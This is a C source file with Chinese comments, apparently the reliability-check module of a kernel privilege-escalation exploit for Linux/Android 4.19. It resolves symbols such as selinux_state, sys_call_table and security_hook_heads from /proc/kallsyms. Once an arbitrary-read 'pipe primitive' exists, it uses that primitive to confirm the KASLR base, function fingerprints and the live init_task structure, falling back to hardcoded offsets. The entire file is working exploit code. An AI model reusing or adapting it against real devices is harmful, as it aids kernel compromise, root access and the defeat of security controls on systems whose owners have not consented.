#define _GNU_SOURCE
#include "robustness.h"
#include "offset.h"
#include "common.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

/*
 * 注意: robustness 模块不能用 pr_error (它会 exit(-1))
 * 只用 pr_info / pr_warning / pr_success
 * _GNU_SOURCE 必须在第一个 include 之前定义 (cpu_set_t 需要)
 */

/* ---- /proc/kallsyms 解析 ---- */

uint64_t kallsyms_resolve(const char *name) {
  int fd = open("/proc/kallsyms", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  char buf[512];
  uint64_t addr = 0;
  FILE *fp = fdopen(fd, "r");
  if (!fp) {
    close(fd);
    return 0;
  }

  while (fgets(buf, sizeof(buf), fp)) {
    /* 格式: address type name [module] */
    char sym_name[256];
    char sym_type;
    uint64_t sym_addr;

    if (sscanf(buf, "%llx %c %255s",
               (unsigned long long *)&sym_addr, &sym_type, sym_name) != 3) {
      continue;
    }

    /* kptr_restrict=2 时地址全0 */
    if (sym_addr == 0) {
      fclose(fp);
      return 0;
    }

    /* 去除可能的模块后缀 */
    char *tab = strchr(sym_name, '\t');
    if (tab) {
      *tab = '\0';
    }

    /* 处理 $hash 后缀 (Clang CFI) */
    char *dollar = strchr(sym_name, '$');
    if (dollar) {
      *dollar = '\0';
    }

    if (strcmp(sym_name, name) == 0) {
      addr = sym_addr;
      break;
    }
  }

  fclose(fp);
  return addr;
}

/* ---- Phase 1: 版本校验 + kallsyms 动态查找 ---- */

static int parse_kernel_version(const char *proc_version, char *out, size_t len) {
  /* 格式: Linux version 4.19.191+ ... */
  const char *p = strstr(proc_version, "Linux version ");
  if (!p) {
    return 0;
  }
  p += strlen("Linux version ");

  size_t i = 0;
  while (i < len - 1 && *p && (isdigit(*p) || *p == '.')) {
    out[i++] = *p++;
  }
  out[i] = '\0';

  /* 去除尾部 + 号 */
  size_t vlen = strlen(out);
  if (vlen > 0 && out[vlen - 1] == '+') {
    out[vlen - 1] = '\0';
  }

  return i > 0;
}

static int get_kernel_series(const char *version, char *out, size_t len) {
  /* 提取 major.minor, 如 "4.19" */
  int major, minor;
  if (sscanf(version, "%d.%d", &major, &minor) != 2) {
    return 0;
  }
  snprintf(out, len, "%d.%d", major, minor);
  return 1;
}

int robustness_check_phase1(robustness_result_t *result) {
  memset(result, 0, sizeof(*result));

  /* 读取 /proc/version */
  int fd = open("/proc/version", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("robustness: cannot open /proc/version\n");
    result->overall_pass = 1; /* 无法检查，允许继续 */
    return 0;
  }

  char version_buf[256];
  ssize_t n = read(fd, version_buf, sizeof(version_buf) - 1);
  close(fd);
  if (n <= 0) {
    pr_warning("robustness: cannot read /proc/version\n");
    result->overall_pass = 1;
    return 0;
  }
  version_buf[n] = '\0';

  /* 解析版本号 */
  if (!parse_kernel_version(version_buf, result->detected_version,
                            sizeof(result->detected_version))) {
    pr_warning("robustness: cannot parse kernel version\n");
    result->overall_pass = 1;
    return 0;
  }

  pr_info("robustness: detected kernel %s, expected %s\n",
          result->detected_version, EXPECTED_KERNEL_VERSION);

  /* 版本比较 */
  char detected_series[16];
  char expected_series[16];
  get_kernel_series(result->detected_version, detected_series,
                    sizeof(detected_series));
  get_kernel_series(EXPECTED_KERNEL_VERSION, expected_series,
                    sizeof(expected_series));

  if (strcmp(result->detected_version, EXPECTED_KERNEL_VERSION) == 0) {
    result->version_match = 1;
    pr_success("robustness: kernel version matches exactly\n");
  } else if (strcmp(detected_series, expected_series) == 0) {
    /* 同系列 (如 4.19.192 vs 4.19.191) */
    result->version_match = 0;
    pr_warning("robustness: same series %s but different patch (got %s)\n",
               detected_series, result->detected_version);
  } else {
    /* 完全不同系列 */
    result->version_match = 0;
    result->overall_pass = 0;
    pr_warning("robustness: kernel series mismatch! expected %s got %s\n",
               expected_series, detected_series);
    pr_warning("robustness: aborting - offsets will not work\n");
    return -1;
  }

  /* 尝试 /proc/kallsyms 动态查找 */
  pr_info("robustness: trying /proc/kallsyms dynamic lookup...\n");

  result->dyn_kallsyms_lookup_name = kallsyms_resolve("kallsyms_lookup_name");
  if (result->dyn_kallsyms_lookup_name != 0) {
    pr_success("robustness: kallsyms_lookup_name found at 0x%llx\n",
               (unsigned long long)result->dyn_kallsyms_lookup_name);
    result->kallsyms_resolved = 1;

    /* 查找其他关键符号 */
    result->dyn_ashmem_fops = kallsyms_resolve("ashmem_fops");
    result->dyn_init_task = kallsyms_resolve("init_task");
    result->dyn_selinux_state = kallsyms_resolve("selinux_state");
    result->dyn_sys_call_table = kallsyms_resolve("sys_call_table");
    result->dyn_security_hook_heads =
        kallsyms_resolve("security_hook_heads");
    result->dyn_km_malloc_caches = kallsyms_resolve("kmalloc_caches");
    result->dyn_anon_pipe_buf_ops = kallsyms_resolve("anon_pipe_buf_ops");
    result->dyn_empty_zero_page = kallsyms_resolve("empty_zero_page");
    result->dyn_nfulnl_logger = kallsyms_resolve("nfulnl_logger");
    result->dyn_loggers = kallsyms_resolve("loggers");

    int resolved_count = 0;
    if (result->dyn_ashmem_fops) resolved_count++;
    if (result->dyn_init_task) resolved_count++;
    if (result->dyn_selinux_state) resolved_count++;
    if (result->dyn_sys_call_table) resolved_count++;
    if (result->dyn_security_hook_heads) resolved_count++;
    if (result->dyn_km_malloc_caches) resolved_count++;
    if (result->dyn_anon_pipe_buf_ops) resolved_count++;
    if (result->dyn_empty_zero_page) resolved_count++;
    if (result->dyn_nfulnl_logger) resolved_count++;
    if (result->dyn_loggers) resolved_count++;

    pr_info("robustness: resolved %d/10 key symbols via kallsyms\n",
            resolved_count);
  } else {
    pr_warning("robustness: /proc/kallsyms restricted (kptr_restrict=2)\n");
    pr_warning("robustness: falling back to hardcoded offsets + fingerprint\n");
    result->kallsyms_resolved = 0;
  }

  result->overall_pass = 1;
  return 0;
}

/* ---- Phase 2: pipe 原语建立后的验证 ---- */

int robustness_check_phase2(
    robustness_result_t *result, int fd, uint64_t kaslr_base) {
  if (!result || fd < 0) {
    return -1;
  }

  result->detected_kbase = kaslr_base;

  /* KASLR base 范围校验 */
  if (kaslr_base >= KASLR_BASE_MIN && kaslr_base <= KASLR_BASE_MAX) {
    result->kaslr_range_ok = 1;
    pr_success("robustness: kaslr_base 0x%llx in valid range\n",
               (unsigned long long)kaslr_base);
  } else {
    result->kaslr_range_ok = 0;
    pr_warning("robustness: kaslr_base 0x%llx out of range [0x%llx, 0x%llx]\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)KASLR_BASE_MIN,
               (unsigned long long)KASLR_BASE_MAX);
  }

  /* 函数序言指纹验证 */
  uintptr_t kallsyms_addr = data_addr(
      kaslr_base + KALLSYMS_LOOKUP_NAME_OFF);
  uint64_t kallsyms_fp = pipe_read64(fd, kallsyms_addr);
  if (kallsyms_fp == EXPECTED_FINGERPRINT_KALLSYMS) {
    result->fingerprint_ok = 1;
    pr_success("robustness: kallsyms_lookup_name fingerprint matches\n");
  } else {
    result->fingerprint_ok = 0;
    pr_warning("robustness: kallsyms fingerprint mismatch: got 0x%llx expected 0x%llx\n",
               (unsigned long long)kallsyms_fp,
               (unsigned long long)EXPECTED_FINGERPRINT_KALLSYMS);
  }

  /* noop_llseek 指纹验证 */
  uintptr_t noop_addr = data_addr(kaslr_base + NOOP_LLSEEK_OFF);
  uint64_t noop_fp = pipe_read64(fd, noop_addr);
  if (noop_fp == EXPECTED_FINGERPRINT_NOOP_LLSEEK) {
    pr_success("robustness: noop_llseek fingerprint matches\n");
  } else {
    pr_warning("robustness: noop_llseek fingerprint mismatch: got 0x%llx expected 0x%llx\n",
               (unsigned long long)noop_fp,
               (unsigned long long)EXPECTED_FINGERPRINT_NOOP_LLSEEK);
  }

  /* init_task 结构体活体验证 */
  uintptr_t init_task_direct = data_addr(kaslr_base + INIT_TASK_OFF);

  /* pid = 0 */
  uint32_t pid = pipe_read32(fd, init_task_direct + TASK_PID_OFF);
  /* tgid = 0 */
  uint32_t tgid = pipe_read32(fd, init_task_direct + TASK_TGID_OFF);
  /* cred → 有效内核指针 */
  uint64_t cred = pipe_read64(fd, init_task_direct + TASK_CRED_OFF);
  /* tasks.next → 有效指针 */
  uint64_t tasks_next =
      pipe_read64(fd, init_task_direct + TASK_TASKS_OFF);

  int liveness = 1;
  if (pid != 0) {
    pr_warning("robustness: init_task.pid=%u (expected 0)\n", pid);
    liveness = 0;
  }
  if (tgid != 0) {
    pr_warning("robustness: init_task.tgid=%u (expected 0)\n", tgid);
    liveness = 0;
  }
  if (!is_kernel_ptr(cred)) {
    pr_warning("robustness: init_task.cred=0x%llx not a kernel ptr\n",
               (unsigned long long)cred);
    liveness = 0;
  }
  if (!is_kernel_ptr(tasks_next)) {
    pr_warning("robustness: init_task.tasks.next=0x%llx not a kernel ptr\n",
               (unsigned long long)tasks_next);
    liveness = 0;
  }

  /* comm 验证 (读8字节) */
  uintptr_t comm_addr = init_task_direct + TASK_COMM_OFF;
  uint64_t comm_lo = pipe_read64(fd, comm_addr);
  /* "swapper\0" = 0x0072657070617773 (little-endian) */
  if ((comm_lo & 0xFFFFFFFFFFFFFFULL) == 0x0072657070617773ULL) {
    /* "swapper" 匹配 */
  } else {
    pr_warning("robustness: init_task.comm mismatch: 0x%llx\n",
               (unsigned long long)comm_lo);
    liveness = 0;
  }

  result->struct_liveness_ok = liveness;
  if (liveness) {
    pr_success("robustness: init_task struct liveness verified\n");
  }

  /* 汇总 */
  int warnings = 0;
  if (!result->kaslr_range_ok) warnings++;
  if (!result->fingerprint_ok) warnings++;
  if (!result->struct_liveness_ok) warnings++;

  if (warnings == 0) {
    pr_success("robustness: all phase2 checks passed\n");
  } else {
    pr_warning("robustness: %d phase2 warnings (continuing)\n", warnings);
  }

  return warnings;
}

const char *robustness_expected_version(void) {
  return EXPECTED_KERNEL_VERSION;
}
